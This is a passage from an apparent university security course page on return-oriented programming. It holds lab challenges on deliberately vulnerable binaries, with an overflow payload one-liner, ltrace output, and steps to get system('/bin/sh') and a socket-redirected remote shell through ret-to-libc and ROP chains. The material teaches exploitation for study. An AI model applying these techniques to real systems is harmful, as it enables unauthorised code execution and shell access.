First, let&#x27;s take a look at the <code>check_password()</code> function.</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ objdump -M intel -d auth | grep -A 15 &quot;&lt;check_password&gt;:&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">080485ec &lt;check_password&gt;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 80485ec:   55                      push   ebp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 80485ed:   89 e5                   mov    ebp,esp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 80485ef:   81 ec 58 05 00 00       sub    esp,0x558</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 80485f5:   c7 04 24 14 00 00 00    mov    DWORD PTR [esp],0x14</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 80485fc:   e8 9f fe ff ff          call   80484a0 &lt;malloc@plt&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 8048601:   a3 38 a0 04 08          mov    ds:0x804a038,eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 8048606:   a1 38 a0 04 08          mov    eax,ds:0x804a038</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 804860b:   85 c0                   test   eax,eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 804860d:   75 18                   jne    8048627 &lt;check_password+0x3b&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 804860f:   c7 04 24 76 87 04 08    mov    DWORD PTR [esp],0x8048776</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 8048616:   e8 95 fe ff ff          call   80484b0 &lt;puts@plt&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 804861b:   c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 8048622:   e8 99 fe ff ff          call   80484c0 &lt;exit@plt&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 8048627:   8d 85 bb fa ff ff       lea    eax,[ebp-0x545]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 804862d:   89 04 24                mov    DWORD PTR [esp],eax</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Lets try <code>0x804860f</code> such that we print the <code>malloc</code> failure message.</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ python2.7 -c &#x27;print &quot;A&quot; * 1353 + &quot;\x0f\x86\x04\x08&quot;&#x27; | ltrace -i -e puts ./auth</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[0x80485df] puts(&quot;Enter password: &quot;Enter password:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">)                                                              = 17</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[0x804861b] puts(&quot;malloc failed&quot;malloc failed</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">)                                                                 = 14</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[0xffffffff] +++ exited (status 1) +++</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="02-challenge---ret-to-libc">02. Challenge - <code>ret-to-libc</code><a class="hash-link" href="#02-challenge---ret-to-libc" title="Direct link to heading">​</a></h3><p>So far, so good!
Now let&#x27;s get serious and do something useful with this.</p><p>Continue working in the <code>01-tutorial-ret-to-libc/</code> folder in the activities archive.</p><p>The final goal of this task is to bypass the NX stack protection and call <code>system(&quot;/bin/sh&quot;)</code>.
We will start with a simple <code>ret-to-plt</code>:</p><ol><li>Display all libc functions linked with the auth binary.</li><li>Return to <code>puts()</code>.
Use ltrace to show that the call is actually being made.</li><li>Find the offset of the <code>&quot;malloc failed&quot;</code> static string in the binary.</li><li>Make the binary print <code>&quot;failed&quot;</code> the second time <code>puts()</code> is called.</li><li><strong>(bonus)</strong> The process should SEGFAULT after printing <code>Enter password:</code> again.
Make it exit cleanly (the exit code does not matter, just no <code>SIGSEGV</code>).
You can move on to the next task without solving this problem.</li><li>Remember how we had ASLR disabled?
The other libc functions are in the memory, you just need to find their addresses.
Find the offset of <code>system()</code> in libc.
Find the offset of the <code>&quot;/bin/sh&quot;</code> string in libc.</li><li>Where is libc linked in the auth binary?
Compute the final addresses and call <code>system(&quot;/bin/sh&quot;)</code> just like you did with <code>puts()</code>.</li></ol><p><strong>Hint 1</strong>:
Use <code>LD_TRACE_LOADED_OBJECTS=1 ./auth</code> instead of <code>ldd</code>.
The latter is not always reliable, because the order in which it loads the libraries might be different than when you actually run the binary.</p><p><strong>Hint 2</strong>:
When you finally attack this, <code>stdin</code> will get closed and the new shell will have nothing to read.
Use <code>cat</code> to concatenate your attack string with <code>stdin</code> like this:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">`cat &lt;(python -c &#x27;print &quot;L33T_ATTACK&quot;&#x27;) - | ./vulnbinary`.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Note the use of the <code>-</code> (dash) character before the <code>|</code> (pipe).
This prevents the closing of the input file descriptor of the pipe when <code>cat</code>&#x27;s output finished (i.e. when the <code>EOF</code> character is received).</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="03-challenge---no-ret-control">03. Challenge - <code>no-ret-control</code><a class="hash-link" href="#03-challenge---no-ret-control" title="Direct link to heading">​</a></h3><p>Go to the <a href="/binary-security/activities/03-challenge-no-ret-control/src"><code>03-challenge-no-ret-control/</code></a> folder in the activities archive.</p><p>Imagine this scenario: we have an executable where we can change at least 4 bytes of random memory, but ASLR is turned on.
We cannot reliably change the value of the return address because of this.
Sometimes <code>ret</code> is not even called at the end of a function.</p><p>Alter the execution of <code>force_exit</code>, in order to call the secret function.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="04-challenge---ret-to-plt">04. Challenge - <code>ret-to-plt</code><a class="hash-link" href="#04-challenge---ret-to-plt" title="Direct link to heading">​</a></h3><p>Go to the <a href="/binary-security/activities/04-ret-to-plt/src"><code>04-challenge-ret-to-plt/</code></a> folder in the activities archive.</p><p><code>random</code> is a small application that generates a random number.</p><p>Your task is to build an exploit that makes the application always print the same second random number.
That is the first printed random number is whatever, but the second printed random number will always be the same, for all runs.
In the sample output below the second printed random number is always <code>1023098942</code> for all runs.</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">hari@solyaris-home:~$ python2.7 -c &#x27;print &lt;payload here&gt;&#x27; | ./random</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hi! Options:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    1. Get random number</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    2. Go outside</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Here&#x27;s a random number: 2070249950. Have fun with it!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hi! Options:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    1. Get random number</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    2. Go outside</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Here&#x27;s a random number: 1023098942. Have fun with it!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Segmentation fault (core dumped)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hari@solyaris-home:~$ python2.7 -c &#x27;print &lt;payload here&gt;&#x27; | ./random</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hi! Options:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    1. Get random number</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    2. Go outside</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Here&#x27;s a random number: 1152946153. Have fun with it!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hi! Options:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    1. Get random number</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    2. Go outside</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Here&#x27;s a random number: 1023098942. Have fun with it!</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>You can use the Python skeleton given in section <a href="#nop-analogy"><code>NOP</code> Analogy</a> for
the buffer overflow input.</p><p><strong>Bonus:</strong> The process should SEGFAULT after printing the second (constant) number.
Make it exit cleanly (the exit code does not matter, just no <code>SIGSEGV</code>).</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="05-challenge---gadget-tutorial">05. Challenge - Gadget Tutorial<a class="hash-link" href="#05-challenge---gadget-tutorial" title="Direct link to heading">​</a></h3><p>This task requires you to construct a payload using gadgets and calling the functions inside such that it will print</p><div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Hello!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">stage A!stage B!</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Make it also print the messages in reverse order:</p><div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Hello!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">stage B!stage A!</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="06-bonus-challenge---echo-service">06. Bonus Challenge - Echo Service<a class="hash-link" href="#06-bonus-challenge---echo-service" title="Direct link to heading">​</a></h3><p>This task is a network service that can be exploited.
Run it locally and try to exploit it.
You&#x27;ll find that if you call <code>system(&quot;/bin/sh&quot;)</code> the shell is opened in the terminal where the server was started instead of the one where the attack takes place.
This happens because the client-server communication takes place over a socket.
When you spawn a shell it will inherit the Standard I/O descriptors from the parent and use those.
To fix this you need to redirect the socket fd into 0,1 (and optionally 2).</p><p>So you will need to do the equivalent of the following, as part of a <code>ROP</code> chain:</p><div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">dup2</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">sockfd</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">dup2</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">sockfd</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">system</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;/bin/sh&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Exploit it first with ASLR disabled and then with it enabled.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusions">Conclusions<a class="hash-link" href="#conclusions" title="Direct link to heading">​</a></h2><p>At the end of this session, you should:</p><ul><li>Understand the limitations of classic buffer overflow attacks, as well as shellcodes.</li><li>Understand and visualise the effect of various simple <code>ROP</code> attacks on a program&#x27;s stack</li><li>Be able to craft and make use of <code>ROP</code> chains in order to hack vulnerable binaries</li></ul></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages navigation"><a class="pagination-nav__link pagination-nav__link--prev" href="/binary-security/Exploitation Techniques/Return-Oriented Programming/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Return-Oriented Programming</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/binary-security/Exploitation Techniques/Return-Oriented Programming Advanced/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Return-Oriented Programming Advanced</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#prerequisites" class="table-of-contents__link toc-highlight">Prerequisites</a></li><li><a href="#recap---aslr" class="table-of-contents__link toc-highlight">Recap - ASLR</a></li><li><a href="#solution---got-and-plt" class="table-of-contents__link toc-highlight">Solution - GOT and PLT</a><ul><li><a href="#further-inspection" class="table-of-contents__link toc-highlight">Further Inspection</a></li></ul></li><li><a href="#return-oriented-programming-rop" class="table-of-contents__link toc-highlight">Return Oriented Programming (<code>ROP</code>)</a><ul><li><a href="#motivation" class="table-of-contents__link toc-highlight">Motivation</a></li><li><a href="#nop-analogy" class="table-of-contents__link toc-highlight">NOP Analogy</a></li></ul></li><li><a href="#gadgets-and-rop-chains" class="table-of-contents__link toc-highlight">Gadgets and <code>ROP</code> Chains</a><ul><li><a href="#code-execution" class="table-of-contents__link toc-highlight">Code Execution</a></li><li><a href="#changing-register-values" class="table-of-contents__link toc-highlight">Changing Register Values</a></li><li><a href="#clearing-the-stack" class="table-of-contents__link toc-highlight">Clearing the Stack</a></li></ul></li><li><a href="#some-useful-tricks" class="table-of-contents__link toc-highlight">Some Useful Tricks</a><ul><li><a href="#memory-spraying" class="table-of-contents__link toc-highlight">Memory Spraying</a></li><li><a href="#checksec-in-pwndbg" class="table-of-contents__link toc-highlight">checksec in pwndbg</a></li><li><a href="#finding-gadgets-in-pwndbg" class="table-of-contents__link toc-highlight">Finding Gadgets in <code>pwndbg</code></a></li></ul></li><li><a href="#further-reading" class="table-of-contents__link toc-highlight">Further Reading</a><ul><li><a href="#rop-gadgets-in-pwntools" class="table-of-contents__link toc-highlight"><code>ROP</code> Gadgets in <code>pwntools</code></a></li><li><a href="#linux-x86-program-start-up" class="table-of-contents__link toc-highlight">Linux x86 Program Start Up</a></li><li><a href="#the-pltsec-schema" class="table-of-contents__link toc-highlight">The <code>.plt.sec</code> Schema</a></li></ul></li><li><a href="#putting-it-all-together-demo" class="table-of-contents__link toc-highlight">Putting it All Together: Demo</a><ul><li><a href="#calling-a-function" class="table-of-contents__link toc-highlight">Calling a Function</a></li><li><a href="#calling-a-function-with-parameters" class="table-of-contents__link toc-highlight">Calling a Function with Parameters</a></li><li><a href="#calling-multiple-functions" class="table-of-contents__link toc-highlight">Calling Multiple Functions</a></li></ul></li><li><a href="#challenges" class="table-of-contents__link toc-highlight">Challenges</a><ul><li><a href="#01-tutorial---bypass-nx-stack-with-return-to-libc" class="table-of-contents__link toc-highlight">01. Tutorial - Bypass NX Stack with return-to-libc</a></li><li><a href="#02-challenge---ret-to-libc" class="table-of-contents__link toc-highlight">02. Challenge - <code>ret-to-libc</code></a></li><li><a href="#03-challenge---no-ret-control" class="table-of-contents__link toc-highlight">03. Challenge - <code>no-ret-control</code></a></li><li><a href="#04-challenge---ret-to-plt" class="table-of-contents__link toc-highlight">04. Challenge - <code>ret-to-plt</code></a></li><li><a href="#05-challenge---gadget-tutorial" class="table-of-contents__link toc-highlight">05. Challenge - Gadget Tutorial</a></li><li><a href="#06-bonus-challenge---echo-service" class="table-of-contents__link toc-highlight">06. Bonus Challenge - Echo Service</a></li></ul></li><li><a href="#conclusions" class="table-of-contents__link toc-highlight">Conclusions</a></li></ul></div></div></div></div></main></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://security-summer-school.github.io/binary/" target="_blank" rel="noopener noreferrer" class="footer__link-item">site<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a href="https://www.facebook.com/SSSUPB/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Facebook<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 SSS Team</div></div></div></footer></div>
<script src="/binary-security/assets/js/runtime~main.74200969.js"></script>
<script src="/binary-security/assets/js/main.d9be8505.js"></script>
</body>
</html>